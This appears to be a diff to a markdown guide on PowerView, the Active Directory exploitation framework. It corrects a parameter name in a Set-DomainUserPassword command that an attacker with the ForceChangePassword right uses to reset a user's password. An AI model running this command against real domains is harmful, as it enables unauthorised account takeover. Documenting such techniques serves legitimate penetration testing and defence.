@@ -32,7 +32,7 @@ PowerView is a PowerShell framework designed for enumerating and exploiting Acti
 If the `ForceChangePassword` permission is granted, an attacker can reset a user's password:
 
 ```
-Set-DomainUserPassword -Identity "username" -NewPassword (ConvertTo-SecureString "NewP@ssword123" -AsPlainText -Force)
+Set-DomainUserPassword -Identity "username" -AccountPassword (ConvertTo-SecureString "NewP@ssword123" -AsPlainText -Force)
 ```
 
 #### Adding a User to a Group
